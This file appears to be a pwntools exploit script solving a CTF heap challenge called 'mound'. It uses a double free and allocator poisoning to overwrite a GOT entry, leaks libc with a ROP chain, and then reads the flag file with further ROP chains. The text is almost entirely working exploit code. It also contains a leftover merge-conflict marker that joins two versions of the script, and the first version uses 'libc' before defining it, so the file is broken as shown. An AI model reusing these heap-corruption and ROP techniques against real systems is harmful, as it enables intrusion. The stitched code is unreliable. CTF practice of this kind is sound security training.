from pwn import *
e = ELF("./src/mound/mound", checksec=False)
context.binary = e
p = remote(args.HOST, int(args.PORT)) if args.REMOTE else e.process()
mcache = (0xbeef << 28) + 0x10
mound_main = (0xdead << 28)
def glibc(idx, data):
    p.sendlineafter("> ","1")
    p.sendafter(": ", data)
    p.sendlineafter(": ", str(idx))
def mound(idx, data, size):
    p.sendlineafter("> ","2")
    p.sendlineafter(": ", str(size))
    p.sendlineafter(": ", str(idx))
    p.sendafter(": ", data)
def edit(idx, data):
    p.sendlineafter("> ","3")
    p.sendlineafter(": ", str(idx))
    p.sendafter(": ", data)
def free(idx):
    p.sendlineafter("> ","4")
    p.sendlineafter(": ", str(idx))
glibc(0, b"B"*23)
glibc(1, b"C"*23)
free(1)
edit(0, b"D"*23)
free(1)
mound(2, p64(mcache) + p64(mound_main + 8 + 0x1000*8 - 16), 16)
# Can now overwrite mound main struct, overwrite top chunk
mound(2, b"E"*16,16)
mound(3, p64(mcache) + p64(e.got['__isoc99_scanf'] - 16),16)
mound(4, p64(e.sym['win']), 32)
padding = b'A'*0x48
poprdi = 0x0000000000401e8b
payload = flat(padding, poprdi, e.got['puts'], e.plt['puts'], e.sym['win'])
p.clean(0.2)
p.send(payload)
leak = u64(p.recvline()[:-1].ljust(8,b"\x00"))
log.info(f"Puts: {hex(leak)}")
libc.address = leak - libc.symbols['puts']
rop = ROP(libc)
if not args.FILENAME:
    rop.read(0, 0x404300, 0x20)
    rop.openat(0, 0x404300, 0)
    rop.getdents64(3, 0x404400, 0x400)
    rop.write(1, 0x404400, 0x400)
    payload = padding + rop.chain()
    p.sendline(payload)
    p.send(b"/pwn\x00")
    filename = p.recvuntil(".txt")[-36:].decode()
    log.info(f"Flag file: {filename}")
    log.info(f"Run with FILENAME={filename}")
else:
    rop.read(0, 0x404300, 0x50)
    rop.openat(0, 0x404300, 0)
    rop.read(3, 0x404400, 0x80)
    rop.write(1, 0x404400, 0x80)
    payload = padding + rop.chain()
    p.sendline(payload)
    p.send(f"/pwn/{args.FILENAME}\x00")
    p.interactive()
=======


def do_pwn(filename=None):
    libc = ELF("./src/libc.so.6", checksec=False) if args.REMOTE else ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    p = remote(args.HOST, int(args.PORT)) if args.REMOTE else e.process()
    mcache = (0xbeef << 28) + 0x10
    mound_main = (0xdead << 28)

    def glibc(idx, data):
        p.sendlineafter(b"> ", b"1")
        p.sendafter(b": ", data)
        p.sendlineafter(b": ", str(idx).encode())

    def mound(idx, data, size):
        p.sendlineafter(b"> ", b"2")
        p.sendlineafter(b": ", str(size).encode())
        p.sendlineafter(b": ", str(idx).encode())
        p.sendafter(b": ", data)

    def edit(idx, data):
        p.sendlineafter(b"> ", b"3")
        p.sendlineafter(b": ", str(idx).encode())
        p.sendafter(b": ", data)

    def free(idx):
        p.sendlineafter(b"> ", b"4")
        p.sendlineafter(b": ", str(idx).encode())
    glibc(0, b"B"*23)
    glibc(1, b"C"*23)
    free(1)
    edit(0, b"D"*23)
    free(1)
    mound(2, p64(mcache) + p64(mound_main + 8 + 0x1000*8 - 16), 16)
    # Can now overwrite mound main struct, overwrite top chunk
    mound(2, b"E"*16, 16)
    mound(3, p64(mcache) + p64(e.got['__isoc99_scanf'] - 16), 16)
    mound(4, p64(e.sym['win']), 32)
    padding = b'A'*0x48
    poprdi = 0x0000000000401e8b
    payload = flat(padding, poprdi, e.got['puts'], e.plt['puts'], e.sym['win'])
    p.clean(0.2)
    p.send(payload)
    leak = u64(p.recvline()[:-1].ljust(8, b"\x00"))
    log.info(f"Puts: {hex(leak)}")
    libc.address = leak - libc.symbols['puts']
    rop = ROP(libc)
    if not filename:
        rop.read(0, 0x404300, 0x20)
        rop.openat(0, 0x404300, 0)
        rop.getdents64(3, 0x404400, 0x400)
        rop.write(1, 0x404400, 0x400)
        payload = padding + rop.chain()
        p.send(payload)
        p.send(b"/pwn\x00")
        filename = p.recvuntil(b".txt")[-36:].decode()
        log.success(f"Leaked filename: {filename}")
        p.close()
        del p
        return filename
    else:
        rop.read(0, 0x404300, 0x50)
        rop.openat(0, 0x404300, 0)
        rop.read(3, 0x404400, 0x80)
        rop.write(1, 0x404400, 0x80)
        payload = padding + rop.chain()
        p.sendline(payload)
        path = f"/pwn/{filename}\x00".encode('latin1')
        p.sendline(path)
        res = p.clean(timeout=1)
        if b'rarctf' in res:
            print(re.findall(r'rarctf{.*}', res.decode())[0])
            exit()
        p.close()
        del p


name = do_pwn()
while True:
    do_pwn(name)